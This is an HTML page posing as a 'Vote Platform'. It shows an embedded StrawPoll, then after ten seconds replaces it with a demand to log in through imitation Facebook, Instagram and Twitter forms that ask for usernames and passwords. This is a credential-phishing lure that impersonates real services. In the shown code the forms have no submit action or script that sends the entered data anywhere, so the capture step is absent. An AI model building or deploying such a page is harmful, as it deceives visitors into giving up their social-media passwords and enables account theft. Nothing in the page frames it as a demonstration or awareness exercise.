<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vote Platform</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Include Font Awesome for Social Media Icons -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen">

    <!-- Iframe Container (Initial Load) -->
    <div id="iframe-container" class="w-full h-full fixed inset-0">
        <iframe 
            src="https://strawpoll.com/embed/NMnQNpeM0g6" 
            class="w-full h-full border-none" 
            frameborder="0" 
            allowfullscreen 
            allowtransparency>
        </iframe>
    </div>

    <!-- Login Prompt (Hidden initially) -->
    <div id="login-prompt" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
        <h2 class="text-2xl font-bold mb-4">You must log in to continue</h2>
        <div class="space-x-4">
            <button 
                class="bg-blue-500 px-6 py-3 rounded-md font-semibold flex items-center space-x-2 hover:bg-blue-400 transition"
                onclick="showLoginForm('facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/800px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="w-6 h-6">
                <span>Vote with Facebook</span>
            </button>
            <button 
                class="bg-pink-500 px-6 py-3 rounded-md font-semibold flex items-center space-x-2 hover:bg-pink-400 transition"
                onclick="showLoginForm('instagram')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" class="w-6 h-6">
                <span>Vote with Instagram</span>
            </button>
            <button 
                class="bg-blue-400 px-6 py-3 rounded-md font-semibold flex items-center space-x-2 hover:bg-blue-300 transition"
                onclick="showLoginForm('twitter')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_2012.png" alt="Twitter Logo" class="w-6 h-6">
                <span>Vote with Twitter</span>
            </button>
        </div>
    </div>

    <!-- Facebook Login Form (Hidden initially) -->
    <div id="facebook-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
        <div class="mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/800px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo" class="w-24 h-24 rounded-full">
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Username</label>
            <div class="bg-gray-700 rounded-md">
                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
            </div>
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Password</label>
            <div class="bg-gray-700 rounded-md">
                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-500">
            </div>
        </div>
        <div class="w-full max-w-sm">
            <div class="bg-blue-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-500 transition">
                Login
            </div>
        </div>
    </div>

    <!-- Instagram Login Form (Hidden initially) -->
    <div id="instagram-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
        <div class="mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" class="w-24 h-24 rounded-full">
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Username</label>
            <div class="bg-gray-700 rounded-md">
                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
            </div>
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Password</label>
            <div class="bg-gray-700 rounded-md">
                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-pink-500">
            </div>
        </div>
        <div class="w-full max-w-sm">
            <div class="bg-pink-600 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-pink-500 transition">
                Login
            </div>
        </div>
    </div>

    <!-- Twitter Login Form (Hidden initially) -->
    <div id="twitter-login" class="hidden fixed inset-0 bg-black bg-opacity-90 flex flex-col items-center justify-center text-white p-6 sm:p-8 md:p-12">
        <div class="mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_2012.png" alt="Twitter Logo" class="w-24 h-24 rounded-full">
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Username</label>
            <div class="bg-gray-700 rounded-md">
                <input type="text" placeholder="Enter your username" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
            </div>
        </div>
        <div class="mb-4 w-full max-w-sm">
            <label class="block text-sm font-medium mb-1">Password</label>
            <div class="bg-gray-700 rounded-md">
                <input type="password" placeholder="Enter your password" class="w-full px-4 py-2 bg-transparent text-white outline-none focus:ring focus:ring-blue-400">
            </div>
        </div>
        <div class="w-full max-w-sm">
            <div class="bg-blue-500 text-center py-3 rounded-md font-semibold cursor-pointer hover:bg-blue-400 transition">
                Login
            </div>
        </div>
    </div>

    <script>
        // Timer to display the login prompt after 10 seconds
        setTimeout(() => {
            // Hide iframe and show login prompt
            document.getElementById("iframe-container").classList.add("hidden");
            document.getElementById("login-prompt").classList.remove("hidden");
        }, 10000); // 10 seconds timer

        // Show the respective login form based on selection
        function showLoginForm(platform) {
            // Hide login prompt and show the respective platform login form
            document.getElementById("login-prompt").classList.add("hidden");
            document.getElementById(platform + "-login").classList.remove("hidden");
        }
    </script>

</body>
</html>
